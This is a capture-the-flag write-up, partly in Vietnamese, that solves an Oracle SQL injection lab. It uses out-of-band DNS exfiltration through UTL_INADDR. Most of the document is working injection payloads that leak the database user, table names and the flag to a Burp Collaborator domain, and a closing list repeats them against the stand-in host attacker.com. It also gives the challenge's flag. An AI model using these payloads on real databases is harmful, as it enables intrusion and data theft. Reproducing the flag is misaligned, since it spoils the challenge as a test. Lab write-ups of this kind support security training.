# SQLi-039: Oracle OOB DNS via UTL_INADDR - Writeup

## Flag: `FLAG{oracle_utl_inaddr_dns}`

---

## Attack Flow

### 1. DETECT
Response luôn giống nhau → OOB required

### 2. IDENTIFY  
Oracle với UTL_INADDR enabled (DNS only, no HTTP)

### 3. ENUMERATE

**Test OOB:**
```sql
1 AND UTL_INADDR.GET_HOST_ADDRESS('test.xxxxx.burpcollaborator.net') IS NOT NULL--
```

**Extract database:**
```sql
1 AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.xxxxx.burpcollaborator.net') IS NOT NULL--
```

DNS Lookup: `ORDER_USER.xxxxx.burpcollaborator.net`

### 4. EXTRACT

**Enumerate tables:**
```sql
1 AND UTL_INADDR.GET_HOST_ADDRESS((SELECT table_name FROM user_tables WHERE ROWNUM=1)||'.xxxxx.burpcollaborator.net') IS NOT NULL--
```

### 5-6. EXFILTRATE

**Extract flag:**
```sql
1 AND UTL_INADDR.GET_HOST_ADDRESS((SELECT value FROM flags WHERE ROWNUM=1)||'.xxxxx.burpcollaborator.net') IS NOT NULL--
```

DNS: `FLAG{oracle_utl_inaddr_dns}.xxxxx.burpcollaborator.net`

🎉 **FLAG:** `FLAG{oracle_utl_inaddr_dns}`

---

## Key Payloads

```sql
-- GET_HOST_ADDRESS (IP lookup)
1 AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') IS NOT NULL--

-- GET_HOST_NAME (reverse lookup)
1 AND UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)||'.attacker.com') IS NOT NULL--
```
